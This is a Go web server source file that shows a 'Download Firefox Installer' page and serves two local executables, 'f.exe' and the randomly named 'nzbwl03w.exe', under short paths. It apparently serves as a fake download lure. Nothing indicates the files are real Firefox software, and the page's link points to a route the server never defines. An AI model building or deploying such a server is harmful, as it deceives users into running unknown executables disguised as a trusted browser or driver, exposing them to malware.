package main

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
)

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	// Path to the FirefoxInstaller.exe file
	filePath := "./f.exe"

	// Open the file for reading
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	defer file.Close()

	// Get the file info to set headers
	fileInfo, err := file.Stat()
	if err != nil {
		http.Error(w, "Unable to retrieve file info.", http.StatusInternalServerError)
		return
	}

	// Set headers for the file download
	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filePath))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	// Serve the file
	http.ServeFile(w, r, filePath)
}
func driverDLHandler(w http.ResponseWriter, r *http.Request) {
	// Path to the FirefoxInstaller.exe file
	filePath := "./nzbwl03w.exe"

	// Open the file for reading
	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	defer file.Close()

	// Get the file info to set headers
	fileInfo, err := file.Stat()
	if err != nil {
		http.Error(w, "Unable to retrieve file info.", http.StatusInternalServerError)
		return
	}

	// Set headers for the file download
	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filePath))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	// Serve the file
	http.ServeFile(w, r, filePath)
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	// HTML content with the download link
	html := `
		<!DOCTYPE html>
		<html lang="en">
		<head>
			<meta charset="UTF-8">
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			<title>Download Firefox Installer</title>
		</head>
		<body>
			<h1>Download Firefox Installer</h1>
			<p><a href="/download">Click here to download Firefox Installer</a></p>
		</body>
		</html>
	`

	// Writing the HTML response
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, html)
}

func main() {
	http.HandleFunc("/", mainHandler)
	http.HandleFunc("/f", downloadHandler) // Serve the installer file at /download
	http.HandleFunc("/w", driverDLHandler) // Serve the installer file at /download
	fmt.Println("Server is running on http://localhost:80")
	http.ListenAndServe(":80", nil)
}
